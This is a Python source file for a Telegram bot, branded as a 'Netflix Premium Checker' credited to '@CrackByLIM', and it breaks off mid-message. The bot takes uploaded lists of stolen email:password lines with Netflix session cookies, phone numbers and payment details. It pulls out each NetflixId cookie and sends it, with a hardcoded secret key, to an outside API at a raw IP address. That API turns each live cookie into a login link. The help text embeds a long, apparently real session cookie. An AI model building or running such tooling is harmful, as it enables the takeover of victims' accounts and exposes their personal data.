import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json
import urllib.parse

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ==================== YOUR API CONFIGURATION ====================
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://104.223.121.139:6969/api/gen"  # YOUR API
SECRET_KEY = "IpYDCxU9VAxqi88ByaVscqTNDJPg7Cg5"  # YOUR SECRET KEY

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== MULTI-LANGUAGE SUPPORT ====================

LANGUAGES = {
    'en': {
        'name': 'English',
        'flag': '🇺🇸',
        'welcome': 'Welcome',
        'start': 'Start',
        'help': 'Help',
        'stats': 'Statistics',
        'clear': 'Clear',
        'language': 'Language',
        'processing': 'Processing',
        'valid': 'VALID',
        'invalid': 'INVALID',
        'email': 'Email',
        'password': 'Password',
        'country': 'Country',
        'phone': 'Phone',
        'plan': 'Plan',
        'quality': 'Quality',
        'streams': 'Max Streams',
        'login_link': 'Login Link',
        'launch': '🎬 LAUNCH NETFLIX',
        'powered_by': 'Powered by',
        'file_received': 'FILE RECEIVED',
        'analyzing': 'ANALYZING FILE',
        'complete': 'PROCESSING COMPLETE',
        'results': 'RESULTS SUMMARY',
        'valid_found': 'Valid Accounts Found',
        'invalid_found': 'Invalid Accounts',
        'success_rate': 'Success Rate',
        'no_valid': 'No valid accounts found',
        'error_occurred': 'ERROR OCCURRED',
        'rate_limit': 'Rate limit exceeded',
        'wrong_format': 'Please upload a .txt file',
        'no_cookies': 'No Netflix cookies found',
        'member_since': 'Member Since',
        'payment_method': 'Payment Method',
        'next_billing': 'Next Billing',
        'extra_member': 'Extra Member',
        'check_command': 'Check Single Cookie',
        'enter_cookie': 'Please enter a Netflix cookie to check',
        'checking': 'CHECKING COOKIE',
        'cookie_valid': 'COOKIE VALID',
        'cookie_invalid': 'COOKIE INVALID',
        'extracted_id': 'Extracted Netflix ID',
        'how_to_use_check': 'HOW TO USE /check',
        'cookie_example': 'Cookie Example',
    },
    'zh': {
        'name': '中文',
        'flag': '🇨🇳',
        'welcome': '欢迎',
        'start': '开始',
        'help': '帮助',
        'stats': '统计',
        'clear': '清除',
        'language': '语言',
        'processing': '处理中',
        'valid': '有效',
        'invalid': '无效',
        'email': '邮箱',
        'password': '密码',
        'country': '国家',
        'phone': '电话',
        'plan': '套餐',
        'quality': '画质',
        'streams': '最大流',
        'login_link': '登录链接',
        'launch': '🎬 启动NETFLIX',
        'powered_by': '技术支持',
        'file_received': '已接收文件',
        'analyzing': '分析文件中',
        'complete': '处理完成',
        'results': '结果总结',
        'valid_found': '有效账户',
        'invalid_found': '无效账户',
        'success_rate': '成功率',
        'no_valid': '未找到有效账户',
        'error_occurred': '发生错误',
        'rate_limit': '请求过多，请稍后再试',
        'wrong_format': '请上传.txt文件',
        'no_cookies': '未找到Netflix cookies',
        'member_since': '加入时间',
        'payment_method': '支付方式',
        'next_billing': '下次计费',
        'extra_member': '额外成员',
        'check_command': '检查单个Cookie',
        'enter_cookie': '请输入要检查的Netflix cookie',
        'checking': '正在检查COOKIE',
        'cookie_valid': 'COOKIE有效',
        'cookie_invalid': 'COOKIE无效',
        'extracted_id': '提取的Netflix ID',
        'how_to_use_check': '如何使用 /check',
        'cookie_example': 'Cookie示例',
    },
    'km': {
        'name': 'ខ្មែរ',
        'flag': '🇰🇭',
        'welcome': 'ស្វាគមន៍',
        'start': 'ចាប់ផ្តើម',
        'help': 'ជំនួយ',
        'stats': 'ស្ថិតិ',
        'clear': 'សម្អាត',
        'language': 'ភាសា',
        'processing': 'កំពុងដំណើរការ',
        'valid': 'ត្រឹមត្រូវ',
        'invalid': 'មិនត្រឹមត្រូវ',
        'email': 'អ៊ីមែល',
        'password': 'ពាក្យសម្ងាត់',
        'country': 'ប្រទេស',
        'phone': 'ទូរស័ព្ទ',
        'plan': 'កញ្ចប់',
        'quality': 'គុណភាព',
        'streams': 'ស្ទ្រីមអតិបរមា',
        'login_link': 'តំណចូល',
        'launch': '🎬 ចូល NETFLIX',
        'powered_by': 'ដំណើរការដោយ',
        'file_received': 'បានទទួលឯកសារ',
        'analyzing': 'កំពុងវិភាគឯកសារ',
        'complete': 'ដំណើរការបានបញ្ចប់',
        'results': 'សង្ខេបលទ្ធផល',
        'valid_found': 'គណនីត្រឹមត្រូវ',
        'invalid_found': 'គណនីមិនត្រឹមត្រូវ',
        'success_rate': 'អត្រាជោគជ័យ',
        'no_valid': 'រកមិនឃើញគណនីត្រឹមត្រូវទេ',
        'error_occurred': 'មានបញ្ហា',
        'rate_limit': 'សំណើច្រើនពេក សូមរង់ចាំ',
        'wrong_format': 'សូមផ្ញើឯកសារ .txt',
        'no_cookies': 'រកមិនឃើញ Netflix cookies ទេ',
        'member_since': 'សមាជិកតាំងពី',
        'payment_method': 'វិធីបង់ប្រាក់',
        'next_billing': 'វិក្កយបត្របន្ទាប់',
        'extra_member': 'សមាជិកបន្ថែម',
        'check_command': 'ពិនិត្យ Cookie តែមួយ',
        'enter_cookie': 'សូមបញ្ចូល Netflix cookie ដើម្បីពិនិត្យ',
        'checking': 'កំពុងពិនិត្យ COOKIE',
        'cookie_valid': 'COOKIE ត្រឹមត្រូវ',
        'cookie_invalid': 'COOKIE មិនត្រឹមត្រូវ',
        'extracted_id': 'Netflix ID ដែលបានទាញយក',
        'how_to_use_check': 'របៀបប្រើ /check',
        'cookie_example': 'ឧទាហរណ៍ Cookie',
    }
}

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== NETFLIX ID EXTRACTOR ====================

def extract_netflix_id_from_cookie(cookie_text):
    """
    Extract NetflixId from various cookie formats
    """
    if not cookie_text:
        return None
    
    # Try different patterns to extract NetflixId
    patterns = [
        r'NetflixId=([^&\s]+)',  # Standard format
        r'netflixid=([^&\s]+)',   # Lowercase
        r'NetflixId%3D([^&\s]+)',  # URL encoded
        r'netflixid%3D([^&\s]+)',  # Lowercase URL encoded
        r'["\']NetflixId["\']\s*:\s*["\']([^"\']+)',  # JSON format
        r'NetflixId=([^;]+)',      # Cookie header format
    ]
    
    for pattern in patterns:
        match = re.search(pattern, cookie_text, re.IGNORECASE)
        if match:
            netflix_id = match.group(1).strip()
            # URL decode if needed
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
            return netflix_id
    
    # If no pattern matches, maybe the whole text is the NetflixId?
    if len(cookie_text) > 50 and '=' not in cookie_text and '&' not in cookie_text:
        return cookie_text
    
    return None

# ==================== ENHANCED FORMAT PARSER ====================

def parse_account_line(line):
    """
    Parse a single line in either format:
    
    Format 1 (old): 
    email:password | Phone: number | Country: name | Cookie: NetflixId=...
    
    Format 2 (new):
    email:password | Country = United States 🇺🇸 | PhoneNumber = 123-456-7890 | 
    MemberSince = January/2021 | Plan = Premium | VideoQuality = UHD | 
    MaxStreams = 4 | NetflixCookies = NetflixId=v%3D3%26ct%3D...
    """
    try:
        line = line.strip()
        if not line:
            return None
        
        account = {}
        
        # First, extract email:password from the beginning
        # Both formats start with email:password
        parts = line.split('|', 1)
        first_part = parts[0].strip()
        
        # Parse email:password
        if ':' in first_part:
            email_pass = first_part.split(':', 1)
            account['email'] = email_pass[0].strip()
            account['password'] = email_pass[1].strip()
        else:
            # Try to find email:password even without proper format
            email_pass_match = re.search(r'([^\s:]+):([^\s|]+)', first_part)
            if email_pass_match:
                account['email'] = email_pass_match.group(1).strip()
                account['password'] = email_pass_match.group(2).strip()
        
        # If we have more parts after the first |
        if len(parts) > 1:
            remaining = parts[1]
            
            # Check which format we're dealing with
            if '=' in remaining and ':' not in remaining:
                # Format 2: Using = as separator
                fields = remaining.split('|')
                for field in fields:
                    field = field.strip()
                    if '=' in field:
                        key, value = field.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        
                        # Normalize keys
                        key_lower = key.lower()
                        
                        if 'phonenumber' in key_lower or 'phone' in key_lower:
                            account['phone'] = value
                        elif 'country' in key_lower:
                            account['country'] = value
                        elif 'plan' in key_lower:
                            account['plan'] = value
                        elif 'videoquality' in key_lower or 'quality' in key_lower:
                            account['quality'] = value
                        elif 'maxstreams' in key_lower or 'streams' in key_lower:
                            account['streams'] = value
                        elif 'netflixcookies' in key_lower or 'cookie' in key_lower or 'netflixid' in key_lower:
                            account['full_cookie'] = value
                            # Extract NetflixId from cookie
                            netflix_id = extract_netflix_id_from_cookie(value)
                            if netflix_id:
                                account['netflix_id'] = netflix_id
                        elif 'membersince' in key_lower:
                            account['member_since'] = value
                        elif 'paymentmethod' in key_lower:
                            account['payment_method'] = value
                        elif 'extramember' in key_lower:
                            account['extra_member'] = value
                        elif 'nextbillingdate' in key_lower:
                            account['next_billing'] = value
            
            else:
                # Format 1: Using : as separator (original format)
                fields = remaining.split('|')
                for field in fields:
                    field = field.strip()
                    if ':' in field:
                        key, value = field.split(':', 1)
                        key = key.strip().lower()
                        value = value.strip()
                        
                        if 'phone' in key:
                            account['phone'] = value
                        elif 'country' in key:
                            account['country'] = value
                        elif 'cookie' in key:
                            account['full_cookie'] = value
                            # Extract NetflixId from cookie
                            netflix_id = extract_netflix_id_from_cookie(value)
                            if netflix_id:
                                account['netflix_id'] = netflix_id
        
        # If we still don't have netflix_id, try to find it anywhere in the line
        if 'netflix_id' not in account:
            netflix_id = extract_netflix_id_from_cookie(line)
            if netflix_id:
                account['netflix_id'] = netflix_id
                # Also try to extract email if we don't have it
                if 'email' not in account:
                    email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
                    if email_match:
                        account['email'] = email_match.group(1)
        
        # Validate we have the minimum required fields
        if 'netflix_id' not in account:
            logger.warning("❌ No NetflixId found in line")
            logger.debug(f"Line content: {line[:200]}...")
            return None
        
        # Ensure we have an email (use placeholder if not found)
        if 'email' not in account:
            account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
            account['password'] = "N/A"
        
        logger.info(f"✅ Parsed account: {account['email']}")
        return account
        
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        logger.debug(f"Problem line: {line[:200]}...")
        return None

# ==================== YOUR API FUNCTIONS ====================

async def check_with_your_api(netflix_id, email="unknown@email.com"):
    """Check Netflix ID using YOUR API - with proper error handling"""
    
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID provided",
            "error_code": "MISSING_ID",
            "email": email
        }
    
    try:
        # YOUR API endpoint - exactly as specified
        url = "http://104.223.121.139:6969/api/gen"
        
        # Data payload exactly as your API expects
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"📡 Calling YOUR API for {email}")
        logger.info(f"🔑 Netflix ID: {netflix_id[:30]}...")
        
        # Make the POST request as specified in your instructions
        response = requests.post(url, json=data, timeout=15)
        result = response.json()
        
        logger.info(f"📥 API Response: {result}")
        
        # Check if API call was successful according to YOUR API's format
        if result.get('success') == True:
            login_url = result.get('login_url')
            if login_url:
                logger.info(f"✅ VALID ACCOUNT: {email}")
                return {
                    "success": True,
                    "login_url": login_url,
                    "email": email,
                    "message": "Account is valid!"
                }
            else:
                return {
                    "success": False,
                    "error": "API returned success but no login URL",
                    "error_code": "MISSING_URL",
                    "email": email
                }
        else:
            # Handle error responses from YOUR API
            error_code = result.get('error_code', 'UNKNOWN_ERROR')
            error_msg = result.get('error', 'Unknown error')
            
            # Map error codes to user-friendly messages
            error_messages = {
                'INVALID_RESPONSE_FORMAT': "Netflix ID is invalid or expired",
                'INVALID_NETFLIX_ID': "Netflix ID is invalid or expired",
                'SERVER_ERROR': "Netflix server error - try again later",
                'MISSING_NETFLIX_ID': "No Netflix ID provided",
                'INVALID_SECRET_KEY': "API configuration error - contact admin",
                'AUTH_URL_EXTRACTION_FAILED': "Could not generate login link",
                'MAINTENANCE_MODE': "API is under maintenance - try again later"
            }
            
            user_message = error_messages.get(error_code, f"Error: {error_msg}")
            
            logger.warning(f"❌ INVALID ACCOUNT: {email} - {user_message}")
            
            return {
                "success": False,
                "error": user_message,
                "error_code": error_code,
                "raw_error": error_msg,
                "email": email
            }
                
    except requests.exceptions.Timeout:
        return {
            "success": False,
            "error": "API request timed out",
            "error_code": "TIMEOUT",
            "email": email
        }
    except requests.exceptions.ConnectionError:
        return {
            "success": False,
            "error": "Cannot connect to API server",
            "error_code": "CONNECTION_ERROR",
            "email": email
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "error_code": "UNKNOWN_ERROR",
            "email": email
        }

# ==================== LANGUAGE SELECTION ====================

async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show language selection menu"""
    keyboard = [
        [
            InlineKeyboardButton(f"{LANGUAGES['en']['flag']} English", callback_data='lang_en'),
            InlineKeyboardButton(f"{LANGUAGES['zh']['flag']} 中文", callback_data='lang_zh'),
        ],
        [
            InlineKeyboardButton(f"{LANGUAGES['km']['flag']} ខ្មែរ", callback_data='lang_km'),
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🌐 **Select your language / 选择语言 / ជ្រើសរើសភាសា**",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle language selection"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    lang_code = query.data.replace('lang_', '')
    
    # Store user's language preference
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['language'] = lang_code
    
    lang = LANGUAGES[lang_code]
    
    await query.edit_message_text(
        f"✅ **{lang['flag']} {lang['name']} selected!**\n\n"
        f"Use /start to begin.",
        parse_mode='Markdown'
    )

def get_lang(user_id):
    """Get user's selected language"""
    if user_id in user_sessions and 'language' in user_sessions[user_id]:
        return user_sessions[user_id]['language']
    return 'en'  # Default to English

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with multi-language support"""
    user = update.effective_user
    user_id = user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    welcome = f"""
╔══════════════════════════════════════════╗
║     🎬 **NETFLIX PREMIUM CHECKER** 🎬    ║
║          {lang['flag']} {lang['name']} version          ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌟 **{lang['welcome']} {user.first_name}!** 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 **Send a .txt file** with accounts in this format:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`email:password | Country = USA | PhoneNumber = 123456 | NetflixCookies = NetflixId=...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ **Features:**
✅ Multi-language support (EN/中文/ខ្មែរ)
✅ Professional account validation
✅ Beautiful premium output
✅ Real-time progress tracking
✅ Detailed statistics
✅ Supports multiple formats
✅ **NEW: /check command for single cookie validation**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - {lang['help']} ℹ️
/stats - {lang['stats']} 📊
/language - {lang['language']} 🌐
/clear - {lang['clear']} 🧹
/check - {lang['check_command']} 🔍

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command with multi-language support"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    help_text = f"""
╔══════════════════════════════════════════╗
║            🆘 **{lang['help']}** 🆘            ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE / 使用方法 / របៀបប្រើ**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Upload .txt file** with multiple accounts
2️⃣ **OR use /check command** for single cookie

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 **{lang['how_to_use_check']}:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`/check NetflixId=v%3D3%26ct%3D...`

{lang['cookie_example']}:
`/check NetflixId=v%3D3%26ct%3DBgjHlOvcAxL7As1J8J9LYv4vKLR4npPUavCpTp4WRErFit1m4Lziy5TudFyhWf2b5h9K0wskC86QohevyPBrJFrbfH72JwMNmKN0whelCd1cmWpZT0rJ29MHMwFZDySfF5TKCLAnGObhzofhleX2I7i3p2kVhBNRWBNABUIuPNZVhhGqozDjBknkZkXwZO4wiTfORPdBzdEGq5V3NZZnYTturjPlopfMw_mRbOJrP6Ps4DQfYNCfjtIH77AyySXT5wbO6qnNZqcVYG0XiSEPG02Q8IWY6TLX1zBINS5pI6-n3lKFV-hyuKzA4ftNmzpwdo1GZTSkgAu6q-FKoQOIAxkThlhCKbzyCoQlcmE-bsxtNxQ7UCahly9M8-lN6D4TbFL0GwNo4BlyMX_b4P-3uA9oCIyV-acyKE4945VbqTPHpLVKLzfUNa4e5-GEdvl9UXoxCMdZCOYItzCtsB2myXehcI0gbIYqe2qkYQfqWKPFgZPcxoGzcESuh9kKavt1zfc-5hMYBiIOCgxH-brBzf5oNb--YHo.%26pg%3DCHWFRMA5FJFGRF4M2RTU2U3CJI%26ch%3DAQEAEAABABSpV7B-qaZtKu4KOMgwROjK_chiZCTB4wU.`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **Error Messages / 错误信息 / សារកំហុស:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• `INVALID_RESPONSE_FORMAT` - Cookie expired/invalid
• `SERVER_ERROR` - Netflix server issue
• `TIMEOUT` - Request timeout

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics with multi-language support"""
    global total_checks, valid_accounts, invalid_accounts
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔══════════════════════════════════════════╗
║        📊 **{lang['stats']}** 📊        ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 **{lang['results']}:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **{lang['valid_found']}:**
  `{valid_accounts}`
• **{lang['invalid_found']}:**
  `{invalid_accounts}`
• **{lang['success_rate']}:**
  `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    if user_id in user_sessions:
        # Keep language preference but clear other data
        lang_pref = user_sessions[user_id].get('language', 'en')
        user_sessions[user_id] = {'language': lang_pref}
    
    await update.message.reply_text(
        f"✅ **{lang['clear']}**\n\nYou can now upload a new file.",
        parse_mode='Markdown'
    )

# ==================== NEW CHECK COMMAND ====================

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check a single Netflix cookie manually"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    global total_checks, valid_accounts, invalid_accounts
    
    # Check rate limit
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"⏰ **{lang['rate_limit']}**",
            parse_mode='Markdown'
        )
        return
    
    # Get the cookie from the command arguments
    if not context.args:
        await update.message.reply_text(
            f"""
╔══════════════════════════════════════════╗
║     ❌ **MISSING COOKIE** ❌     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{lang['enter_cookie']}

📝 **{lang['cookie_example']}:**
`/check NetflixId=v%3D3%26ct%3DBgjHlOvcAxL7...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    # Join all arguments to get the full cookie
    cookie_text = ' '.join(context.args)
    
    # Send checking message
    checking_msg = await update.message.reply_text(
        f"""
╔══════════════════════════════════════════╗
║     🔍 **{lang['checking']}** 🔍     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏳ **Status:** Validating cookie...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
        """,
        parse_mode='Markdown'
    )
    
    # Extract Netflix ID from the cookie
    netflix_id = extract_netflix_id_from_cookie(cookie_text)
    
    if not netflix_id:
        await checking_msg.edit_text(
            f"""
╔══════════════════════════════════════════╗
║     ❌ **{lang['cookie_invalid']}** ❌     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ **Error:** Could not extract Netflix ID from the provided text

📝 **{lang['cookie_example']}:**
`NetflixId=v%3D3%26ct%3DBgjHlOvcAxL7...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    # Check with API
    result = await check_with_your_api(netflix_id, f"manual_check_{netflix_id[:8]}")
    
    total_checks += 1
    
    if result.get('success'):
        valid_accounts += 1
        
        # Success message
        success_msg = f"""
╔══════════════════════════════════════════╗
║     ✅ **{lang['cookie_valid']}** ✅     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 **{lang['extracted_id']}:**
`{netflix_id[:50]}...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 **{lang['login_link']}:**
`{result['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ **{lang['powered_by']} {YOUR_CREDIT}** ✨
        """
        
        keyboard = [[InlineKeyboardButton(lang['launch'], url=result['login_url'])]]
        await checking_msg.edit_text(
            success_msg,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    else:
        invalid_accounts += 1
        
        # Error message
        error_msg = f"""
╔══════════════════════════════════════════╗
║     ❌ **{lang['cookie_invalid']}** ❌     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 **{lang['extracted_id']}:**
`{netflix_id[:50]}...`

❌ **Error:** {result.get('error', 'Unknown error')}
📋 **Error Code:** `{result.get('error_code', 'UNKNOWN')}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 **Note:** The cookie may be expired or invalid

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        await checking_msg.edit_text(error_msg, parse_mode='Markdown')

# ==================== FILE HANDLER WITH MULTI-LANGUAGE ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files with beautiful output"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    global total_checks, valid_accounts, invalid_accounts
    
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"⏰ **{lang['rate_limit']}**",
            parse_mode='Markdown'
        )
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"❌ **{lang['wrong_format']}**",
            parse_mode='Markdown'
        )
        return
    
    # Beautiful progress message
    progress_msg = await update.message.reply_text(
        f"""
╔══════════════════════════════════════════╗
║     📥 **{lang['file_received']}** 📥     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
⏳ **Status:** Downloading...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
        """,
        parse_mode='Markdown'
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into lines (each line is one account)
        lines = content.split('\n')
        accounts = [line.strip() for line in lines if line.strip()]
        
        await progress_msg.edit_text(
            f"""
╔══════════════════════════════════════════╗
║     📊 **{lang['analyzing']}** 📊     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
🔍 **Accounts Found:** `{len(accounts)}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
            """,
            parse_mode='Markdown'
        )
        
        valid_count = 0
        invalid_count = 0
        error_counts = defaultdict(int)
        
        for i, line in enumerate(accounts, 1):
            # Parse the line
            account = parse_account_line(line)
            
            if not account:
                invalid_count += 1
                error_counts['PARSING_FAILED'] += 1
                continue
            
            # Update progress with beautiful bar
            if i % 2 == 0 or i == len(accounts):
                progress = i / len(accounts)
                bar_length = 20
                filled = int(bar_length * progress)
                bar = "█" * filled + "░" * (bar_length - filled)
                
                await progress_msg.edit_text(
                    f"""
╔══════════════════════════════════════════╗
║     🔄 **{lang['processing']}...** 🔄     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **Progress:** `{i}/{len(accounts)}`
📈 **{progress*100:.1f}%** `{bar}`

✅ **{lang['valid_found']}:** `{valid_count}`
❌ **{lang['invalid_found']}:** `{invalid_count}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
                    """,
                    parse_mode='Markdown'
                )
            
            # Check with YOUR API
            result = await check_with_your_api(account['netflix_id'], account['email'])
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # Beautiful valid account output with all available details
                details = []
                if account.get('country'):
                    details.append(f"🌍 **{lang['country']}:** `{account['country']}`")
                if account.get('phone'):
                    details.append(f"📞 **{lang['phone']}:** `{account['phone']}`")
                if account.get('plan'):
                    details.append(f"📺 **{lang['plan']}:** `{account['plan']}`")
                if account.get('quality'):
                    details.append(f"🎨 **{lang['quality']}:** `{account['quality']}`")
                if account.get('streams'):
                    details.append(f"📱 **{lang['streams']}:** `{account['streams']}`")
                if account.get('member_since'):
                    details.append(f"📅 **{lang['member_since']}:** `{account['member_since']}`")
                if account.get('payment_method'):
                    details.append(f"💳 **{lang['payment_method']}:** `{account['payment_method']}`")
                if account.get('next_billing'):
                    details.append(f"⏰ **{lang['next_billing']}:** `{account['next_billing']}`")
                if account.get('extra_member'):
                    details.append(f"👥 **{lang['extra_member']}:** `{account['extra_member']}`")
                
                details_str = '\n'.join(details) if details else ''
                
                msg = f"""
✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨
     ⭐ **{lang['valid']} ACCOUNT #{valid_count}** ⭐     
✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨

